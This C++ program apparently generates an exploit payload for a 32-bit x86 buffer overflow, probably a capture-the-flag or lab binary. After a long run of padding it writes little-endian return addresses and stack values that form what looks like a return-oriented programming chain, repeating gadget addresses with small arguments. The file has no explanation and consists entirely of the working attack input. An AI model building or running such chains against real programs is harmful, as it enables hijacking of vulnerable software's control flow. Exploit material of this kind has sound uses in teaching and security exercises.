#include <bits/stdc++.h>
using namespace std;


int main()
{ 
   string s;

   for(int i = 0;i<16;i++)
   {
      s.push_back('1');
   }
   s.push_back('\n');

   for(int i = 0;i<1174;i++)
   {
      s.push_back('0');
      s.push_back('\n');
   }

    //0x08048433
    s.push_back(0x33);s.push_back('\n');
    s.push_back(0x84);s.push_back('\n');
    s.push_back(0x04);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    //0xffffd05e
    s.push_back(0x5e);s.push_back('\n');
    s.push_back(0xd0);s.push_back('\n');
    s.push_back(0xff);s.push_back('\n');
    s.push_back(0xff);s.push_back('\n');

   // 0x08048480
    s.push_back(0x80);s.push_back('\n');
    s.push_back(0x84);s.push_back('\n');
    s.push_back(0x04);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    //0xffffd000
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0xd0);s.push_back('\n');
    s.push_back(0xff);s.push_back('\n');
    s.push_back(0xff);s.push_back('\n');

    s.push_back(0x61);s.push_back('\n');
    s.push_back(0xec);s.push_back('\n');
    s.push_back(0x0d);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
     
    s.push_back(0x20);s.push_back('\n');
    s.push_back(0xba);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    
    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
  //  0x0805bf42

    s.push_back(0x20);s.push_back('\n');
    s.push_back(0xba);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0xfb);s.push_back('\n');
    s.push_back(0x4b);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');

    s.push_back(0x58);s.push_back('\n');
    s.push_back(0x32);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

      for(int i=4;i>=2;i--) {

        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');

        s.push_back(0xbb);s.push_back('\n');
        s.push_back(0x64);s.push_back('\n');
        s.push_back(0x0d);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
         
        s.push_back(0x61);s.push_back('\n');
        s.push_back(0xec);s.push_back('\n');
        s.push_back(0x0d);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');

        s.push_back(0x20);s.push_back('\n');
        s.push_back(0xba);s.push_back('\n');
        s.push_back(0x0e);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');


        s.push_back(0x76);s.push_back('\n');
        s.push_back(0x83);s.push_back('\n');
        s.push_back(0x0b);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');

        s.push_back((unsigned char)i);s.push_back('\n');
        s.push_back(0x00);s.push_back('\n');
        s.push_back(0x00);s.push_back('\n');
        s.push_back(0x00);s.push_back('\n');

        s.push_back(0x42);s.push_back('\n');
        s.push_back(0xbf);s.push_back('\n');
        s.push_back(0x05);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
        
        s.push_back(0x20);s.push_back('\n');
        s.push_back(0xba);s.push_back('\n');
        s.push_back(0x0e);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');

        s.push_back(0xfb);s.push_back('\n');
        s.push_back(0x4b);s.push_back('\n');
        s.push_back(0x05);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
        
        s.push_back(0x4a);s.push_back('\n');
        s.push_back(0xf4);s.push_back('\n');
        s.push_back(0x04);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');

        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');

        s.push_back(0x58);s.push_back('\n');
        s.push_back(0x32);s.push_back('\n');
        s.push_back(0x06);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
    }

    s.push_back(0x01);s.push_back('\n');
    s.push_back(0x01);s.push_back('\n');
    s.push_back(0x01);s.push_back('\n');
    s.push_back(0x01);s.push_back('\n');

    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x20);s.push_back('\n');
    s.push_back(0xba);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0xfb);s.push_back('\n');
    s.push_back(0x4b);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n'); 

    s.push_back(0x6a);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x31);s.push_back('\n');
    s.push_back(0x38);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
   
    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x6c);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x42);s.push_back('\n');
    s.push_back(0x30);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');

    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x6e);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x35);s.push_back('\n');
    s.push_back(0x36);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');

    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x7a);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x31);s.push_back('\n');
    s.push_back(0x38);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');

    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x7c);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x42);s.push_back('\n');
    s.push_back(0x30);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');

    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x7e);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n'); 

    s.push_back(0x33);s.push_back('\n');
    s.push_back(0x32);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');

    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x89);s.push_back('\n');
    s.push_back(0x04);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');

    cout<<s;

   return 0;
}










